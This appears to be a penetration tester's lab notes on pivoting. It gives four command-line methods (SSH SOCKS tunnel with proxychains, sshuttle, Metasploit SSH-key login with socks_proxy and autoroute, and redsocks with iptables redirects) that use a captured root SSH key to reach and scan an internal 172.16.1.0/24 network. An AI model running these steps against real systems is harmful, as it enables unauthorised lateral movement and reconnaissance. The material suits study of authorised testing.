#### Pivoting

### method 1:

Add to proxychains.conf:
`socks4 127.0.0.1 9000`  
`ssh -D 1080 -i 10.10.110.123/root_ssh root@NIX01`  
`proxychains nmap -sV 172.16.1.0-254`  

### Method 2:
*if I could nmap through this tunnel it would be the preffered method  

`sshuttle -vr root@NIX01 172.16.1.1/24 --ssh-cmd "ssh -i 10.10.110.123/root_ssh"`  

### Method 3:  
msf > use auxiliary/scanner/ssh/ssh_login_pubkey  
msf auxiliary(ssh_login_pubkey) > set RHOSTS 10.10.110.123    
msf auxiliary(ssh_login_pubkey) > set USERNAME root  
msf auxiliary(ssh_login_pubkey) > set KEY_PATH 10.10.110.123/root_ssh  
msf auxiliary(ssh_login_pubkey) > run  
ctrl+z
sessions -u 2
background
use auxiliary/server/socks_proxy
run


meterpreter > run post/multi/manage/autoroute  
CTRL+Z  
use auxiliary/scanner/portscan/tcp   
set RHOSTS 172.16.1.0/24  

hhmmmmMMMM I must be doing something wrong I can curl some ip's I know are on the other side but cannot nmap or scan the range...   
dd

### Method 4:  

`ssh -D 1080 -i 10.10.110.123/root_ssh root@NIX01` *1080 is redsocks proxy default*  
`echo 1 > /proc/sys/net/ipv4/ip_forward`  
`iptables -t nat -A OUTPUT -p tcp -d 172.16.1.0/24 -j REDIRECT --to-ports 12345`  
`iptables -t nat -A PREROUTING -p tcp -d 172.16.1.0/24 -j REDIRECT --to-ports 12345`  
`/usr/sbin/redsocks -c /etc/redsocks.conf `
